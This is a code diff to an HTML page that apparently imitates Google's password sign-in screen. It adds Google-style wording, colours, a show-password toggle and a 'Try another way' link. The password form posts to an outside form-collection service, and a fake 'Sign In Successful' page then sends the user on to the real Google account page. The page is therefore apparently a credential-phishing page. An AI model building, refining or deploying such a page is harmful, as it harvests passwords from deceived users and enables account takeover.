@@ -155,6 +155,31 @@
             font-size: 18px;
         }
 
+        .password-page {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .show-password-wrapper {
+            display: flex;
+            justify-content: flex-start;
+            width: 100%;
+        }
+
+        .show-password-wrapper input {
+            margin-right: 10px;
+        }
+
+        .try-another-way {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 10px;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
@@ -181,7 +206,17 @@
         <div class="right-side-container" id="passwordPage" style="display: none;">
             <!-- Password input page -->
             <form id="passwordForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitPassword(event)">
+                <p id="welcomeText">Welcome</p>
                 <input type="password" id="passwordInput" name="password" class="input-box" placeholder="Enter your password" autocomplete="current-password">
+                
+                <!-- Show Password Option -->
+                <div class="show-password-wrapper">
+                    <input type="checkbox" id="showPassword" onclick="togglePassword()"> Show Password
+                </div>
+                
+                <!-- Try Another Way link -->
+                <a href="#" class="try-another-way">Try another way</a>
+
                 <div class="btn-container">
                     <button type="submit" class="btn">Sign In</button>
                 </div>
@@ -192,7 +227,7 @@
     <div class="success-page" id="successPage">
         <h1>Sign In Successful</h1>
         <p>You have successfully signed in!</p>
-        <a href="#" class="btn" onclick="goToDashboard()">Go to Dashboard</a>
+        <a href="https://myaccount.google.com" class="btn" target="_blank">Go to Dashboard</a>
     </div>
 
     <div class="footer">
@@ -224,16 +259,21 @@
 
             // Form submission logic
             // Here you can either use Formspree for submission or perform other actions
-            // You can also use fetch() or any AJAX methods to submit the form
 
             // Hide the form and show the success page
             document.getElementById('signinBox').style.display = 'none';
             document.getElementById('successPage').style.display = 'flex'; // show success page
         }
 
-        function goToDashboard() {
-            // Redirect or reload to dashboard after successful sign-in
-            window.location.href = '/dashboard'; // Replace with your desired path
+        function togglePassword() {
+            var passwordField = document.getElementById('passwordInput');
+            var showPasswordCheckbox = document.getElementById('showPassword');
+
+            if (showPasswordCheckbox.checked) {
+                passwordField.type = 'text'; // Show password
+            } else {
+                passwordField.type = 'password'; // Hide password
+            }
         }
     </script>
 </body>
